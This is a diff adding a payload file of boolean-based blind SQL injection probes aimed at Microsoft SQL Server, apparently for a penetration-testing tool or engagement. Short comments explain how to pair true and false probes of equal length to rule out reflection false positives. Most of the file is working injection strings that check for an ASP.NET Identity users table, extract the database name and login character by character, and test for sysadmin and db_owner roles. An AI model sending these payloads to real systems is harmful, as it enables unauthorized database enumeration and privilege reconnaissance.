@@ -1,0 +1,43 @@
+# ── Fixed-length boolean probes (reflection-resistant) ────────────────────────
+# These pairs are the same LENGTH but produce different SQL outcomes.
+# If the size delta matches the reflection ratio → false positive.
+# If true/false produce DIFFERENT size deltas → real boolean blind injection.
+#
+# Pad format: ss'[condition]--[padding to equalise length] wXyW
+# TRUE conditions first, FALSE second — compare deltas in pairs.
+
+# Pair 1: 1=1 (true) vs 1=2 (false) — same length
+ss' AND 1=1--                wXyW
+ss' AND 1=2--                wXyW
+
+# Pair 2: Tautology vs contradiction via string comparison
+ss' AND 'a'='a'--            wXyW
+ss' AND 'a'='b'--            wXyW
+
+# Pair 3: Known-true subquery vs known-false
+ss' AND (SELECT COUNT(*) FROM sysobjects)>0-- wXyW
+ss' AND (SELECT COUNT(*) FROM sysobjects)<0-- wXyW
+
+# ── AspNetUsers existence check ───────────────────────────────────────────────
+# True if AspNetUsers table exists, false if not
+ss' AND (SELECT COUNT(*) FROM AspNetUsers)>0-- wXyW
+ss' AND (SELECT COUNT(*) FROM AspNetUsers)<0-- wXyW
+
+# ── First character of DB_NAME() — binary search ──────────────────────────────
+# Each pair tests one character position of the DB name
+# Adjust CHAR() values to binary-search for the actual character
+ss' AND ASCII(SUBSTRING(DB_NAME(),1,1))>64-- wXyW
+ss' AND ASCII(SUBSTRING(DB_NAME(),1,1))>96-- wXyW
+ss' AND ASCII(SUBSTRING(DB_NAME(),1,1))>112-- wXyW
+ss' AND ASCII(SUBSTRING(DB_NAME(),1,1))>104-- wXyW
+ss' AND ASCII(SUBSTRING(DB_NAME(),1,1))>100-- wXyW
+
+# ── First character of SYSTEM_USER ────────────────────────────────────────────
+ss' AND ASCII(SUBSTRING(SYSTEM_USER,1,1))>64-- wXyW
+ss' AND ASCII(SUBSTRING(SYSTEM_USER,1,1))>96-- wXyW
+ss' AND ASCII(SUBSTRING(SYSTEM_USER,1,1))>115-- wXyW
+
+# ── Privilege checks ──────────────────────────────────────────────────────────
+ss' AND IS_SRVROLEMEMBER('sysadmin')=1-- wXyW
+ss' AND IS_SRVROLEMEMBER('sysadmin')=0-- wXyW
+ss' AND IS_MEMBER('db_owner')=1-- wXyW
